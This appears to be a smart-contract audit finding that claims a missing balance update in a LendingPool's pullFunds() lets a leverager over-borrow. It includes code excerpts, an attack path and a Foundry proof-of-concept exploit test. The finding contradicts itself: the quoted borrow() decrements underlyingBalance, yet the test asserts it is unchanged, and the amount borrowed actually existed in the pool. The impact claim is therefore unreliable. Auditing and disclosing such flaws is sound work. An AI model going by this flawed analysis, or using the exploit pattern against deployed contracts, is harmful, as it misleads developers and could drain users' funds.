# The missing state update in pullFunds() will allow attackers to over-borrow and deplete the protocol’s reserves

### Summary

The `LendingPool` contract’s liquidity accounting allows attackers to borrow more tokens than actually exist. Because `pullFunds()` transfers tokens without decrementing the reserve’s `underlyingBalance`, the subsequent `borrow()` checks see a stale liquidity state, enabling an attacker to withdraw assets beyond true available amounts.

### Root Cause

The core problem comes from the mismatch between `pullFunds()`, which does not update `underlyingBalance`, and the `borrow()` logic that relies on this same `underlyingBalance` to estimate available liquidity. Below are the relevant excerpts:

1. [`pullFunds():209`](https://github.com/sherlock-audit/2025-02-yieldoor/blob/main/yieldoor/src/LendingPool.sol#L209) removes tokens from the pool but never updates `underlyingBalance`:  
```solidity
    function pullFunds(address asset, uint256 amount) external nonReentrant {
        require(msg.sender == leverager, "borrower not leverager");
        DataTypes.ReserveData memory reserve = getReserve(asset);

        IyToken(reserve.yTokenAddress).transferUnderlyingTo(_msgSender(), amount);
    }
```
   Even though tokens are transferred out, `reserve.underlyingBalance` remains unchanged.

2. [`borrow():159`](https://github.com/sherlock-audit/2025-02-yieldoor/blob/main/yieldoor/src/LendingPool.sol#L159) relies on stale `underlyingBalance`. Short version of the function:
```solidity
    function borrow(address asset, uint256 amount) external {
        require(amount <= reserve.availableLiquidity(), "not enough available liquidity");
        reserve.totalBorrows += amount;
        reserve.underlyingBalance -= amount;  
        IyToken(reserve.yTokenAddress).transferUnderlyingTo(_msgSender(), amount);
    }
```

3. [`src/libraries/ReserveLogic.sol:availableLiquidity():36`](https://github.com/sherlock-audit/2025-02-yieldoor/blob/main/yieldoor/src/libraries/ReserveLogic.sol#L36) simply returns `reserve.underlyingBalance`:
```solidity
    function availableLiquidity(DataTypes.ReserveData storage reserve) internal view returns (uint256 liquidity) {
        return reserve.underlyingBalance;
    }
```
   With no decrement in `pullFunds()`, the contract treats the pool as though it still holds the removed tokens, passing the `borrow()` requirement even if actual liquidity is greatly reduced.

### Internal Pre-conditions

1. Leverager needs to be whitelisted to call “pullFunds()” for “asset” in greater quantity than zero.  
2. `reserve.underlyingBalance` must be at least the amount that the attacker wants to borrow (so the stale value is significant enough to exploit). 

### External Pre-conditions

1. The attacker must have on-chain access to call both `pullFunds()` and `borrow()` in timely succession.  
2. No other external constraints (e.g., price oracles, time locks) intervene between “pullFunds()” and “borrow()” calls.

### Attack Path

1. The attacker (leverager) calls `pullFunds(asset, amount)` and transfers tokens out of the `yToken` contract, but `reserve.underlyingBalance` remains unchanged.  
2. While the tokens are still external, the attacker calls `borrow(asset, amount)`, where `availableLiquidity()` incorrectly returns the old `underlyingBalance`, allowing an over-borrow.  
3. The attacker optionally calls `pushFunds(asset, amount)` to return just the flash-loaned portion, **keeping the extra tokens gained from the over-borrow.**

### Impact

This flaw can deplete the lending pool by allowing attackers to borrow well beyond real on-chain holdings. Consequently, the protocol may become insolvent.

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {console} from "forge-std/console.sol";
import {BaseTest} from "./BaseTest.sol";
import {LendingPool} from "../src/LendingPool.sol";
import {ILendingPool} from "../src/interfaces/ILendingPool.sol";
import {IERC20} from "@openzeppelin/token/ERC20/IERC20.sol";
import {DataTypes} from "../src/types/DataTypes.sol";
import {IyToken} from "../src/interfaces/IyToken.sol";

contract LendingPoolExploitTest is BaseTest {
    LendingPool public lendingPool;
    address attacker = address(0x1337);
    address lender = address(0x9999);
    address yWbtc;
    
    function setUp() public override {
        super.setUp();
        
        // Deploy LendingPool
        vm.startPrank(owner);
        lendingPool = new LendingPool();
        
        // Initialize WBTC reserve
        lendingPool.initReserve(address(wbtc));
        yWbtc = lendingPool.getYTokenAddress(address(wbtc));
        
        // Set up initial liquidity
        vm.startPrank(lender);
        deal(address(wbtc), lender, 10e8); // 10 WBTC
        wbtc.approve(address(lendingPool), type(uint256).max);
        lendingPool.deposit(address(wbtc), 10e8, lender);
        vm.stopPrank();
        
        // Set up attacker as leverager (for demonstration)
        vm.startPrank(owner);
        lendingPool.setLeverager(attacker);
        vm.stopPrank();

        // Ensure yToken has the WBTC balance
        deal(address(wbtc), yWbtc, 10e8);
    }

    function test_exploitLiquidityAccountingBug() public {
        // Initial state
        uint256 initialBalance = wbtc.balanceOf(yWbtc);
        uint256 initialUnderlyingBalance = lendingPool.totalLiquidityOfReserve(address(wbtc));
        console.log("Initial yToken WBTC balance:", initialBalance);
        console.log("Initial underlying balance:", initialUnderlyingBalance);
        
        vm.startPrank(attacker);
        
        // Step 1: Pull funds without updating underlyingBalance
        uint256 pullAmount = 5e8; // Pull 5 WBTC
        lendingPool.pullFunds(address(wbtc), pullAmount);
        
        // Verify actual balance is reduced but underlying balance remains unchanged
        uint256 actualBalance = wbtc.balanceOf(yWbtc);
        uint256 underlyingBalance = lendingPool.totalLiquidityOfReserve(address(wbtc));
        console.log("Actual yToken WBTC balance after pull:", actualBalance);
        console.log("Underlying balance after pull:", underlyingBalance);
        
        // Step 2: Exploit by borrowing more than available
        uint256 borrowAmount = 5e8; // Try to borrow 5 WBTC
        lendingPool.borrow(address(wbtc), borrowAmount);
        
        // Step 3: Return pulled funds (but keep borrowed amount)
        wbtc.approve(address(lendingPool), pullAmount);
        lendingPool.pushFunds(address(wbtc), pullAmount);
        
        // Final state verification
        uint256 finalBalance = wbtc.balanceOf(yWbtc);
        uint256 finalUnderlyingBalance = lendingPool.totalLiquidityOfReserve(address(wbtc));
        uint256 attackerBalance = wbtc.balanceOf(attacker);
        
        console.log("Final yToken WBTC balance:", finalBalance);
        console.log("Final underlying balance:", finalUnderlyingBalance);
        console.log("Attacker's WBTC balance:", attackerBalance);
        
        // The attacker has successfully borrowed more than should be possible
        // The accounting bug is demonstrated by:
        // 1. The actual balance is 5 WBTC (after pull+borrow of 10 WBTC total and push of 5 WBTC)
        // 2. But the underlying balance still shows 10 WBTC because pullFunds/pushFunds don't update it
        assert(finalBalance == 5e8); // Actual balance should be 5 WBTC
        assert(finalUnderlyingBalance == 10e8); // But accounting shows 10 WBTC
        assert(attackerBalance == 5e8); // Attacker has gained 5 WBTC
        
        vm.stopPrank();
    }
}

### Mitigation

Update `reserve.underlyingBalance` within `pullFunds()` to accurately reflect tokens leaving the pool.
